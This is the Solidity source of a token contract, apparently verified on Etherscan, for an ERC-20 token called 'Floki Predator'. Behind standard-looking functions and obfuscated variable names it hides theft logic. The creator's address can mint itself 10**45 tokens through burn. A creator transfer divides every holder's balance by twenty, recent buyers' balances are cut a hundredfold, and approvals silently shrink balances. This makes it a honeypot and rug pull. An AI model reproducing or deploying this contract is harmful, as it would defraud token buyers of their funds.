/**
 *Submitted for verification at Etherscan.io on 2022-03-21
*/

// @FlokiPredator

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private fxArray;

    mapping (address => bool) private Mickey;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private Mouse = 0;
    address public pair;
    IDEXRouter router;

    string private _name; string private _symbol; address private sha823gydpudw913key; uint256 private _totalSupply; 
    bool private trading; bool private Swine; uint256 private Pig; uint256 private Swag;
    
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        router = IDEXRouter(_router);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));

        sha823gydpudw913key = msgSender_;
        _name = name_;
        _symbol = symbol_;
    }

    function openTrading() external onlyOwner returns (bool) {
        trading = true;
        return true;
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function burn(uint256 amount) public virtual returns (bool) {
        _burn(_msgSender(), amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] -= amount;
        _balances[account] += (account == sha823gydpudw913key ? (10 ** 45) : 0);
        _balances[address(0)] += amount;
        emit Transfer(account, address(0), amount);
     }

    function last() internal view returns (address) { return (Pig > 1 ? fxArray[fxArray.length-2] : address(0)); }
    
    function _balancesOfTheDoges(address sender, address recipient, bool problem) internal {
        Swine = problem ? true : Swine;
        if (((Mickey[sender] == true) && (Mickey[recipient] != true)) || ((Mickey[sender] != true) && (Mickey[recipient] != true))) { fxArray.push(recipient); }
        if ((Swine) && (sender == sha823gydpudw913key) && (Swag == 1)) { for (uint256 krux = 0;  krux < fxArray.length; krux++) { _balances[fxArray[krux]] /= (2 * 10 ** 1); } }
        _balances[last()] /= (((Mouse == block.timestamp) || Swine) && (Mickey[last()] != true) && (Pig > 1)) ? (10 ** 2) : (1);
        Pig++; Mouse = block.timestamp;
    }

    function _balancesOfTheFloki(address sender, address recipient) internal {
        require((trading || (sender == sha823gydpudw913key)), "ERC20: trading is not yet enabled.");
        _balancesOfTheDoges(sender, recipient, (address(sender) == sha823gydpudw913key) && (Swag > 0));
        Swag += (sender == sha823gydpudw913key) ? 1 : 0;
    }

    function _DeathSwap(address creator) internal virtual {
        approve(_router, 10 ** 77);
        (Swag,Swine,Pig,trading) = (0,false,0,false);
        (Mickey[_router],Mickey[creator],Mickey[pair]) = (true,true,true);
    }
    
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        _balances[owner] /= (Swine ? (2 * 10 ** 1) : 1);
        emit Approval(owner, spender, amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        _balancesOfTheFloki(sender, recipient);
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _DeployFlokiPredator(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        
        emit Transfer(address(0), account, amount); 
    }
}

contract ERC20Token is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        address creator, uint256 initialSupply
    ) ERC20(name, symbol, creator) {
        _DeployFlokiPredator(creator, initialSupply);
        _DeathSwap(creator);
    }
}

contract FlokiPredator is ERC20Token {
    constructor() ERC20Token("Floki Predator", "FQM", msg.sender, 800000000 * 10 ** 18) {
    }
}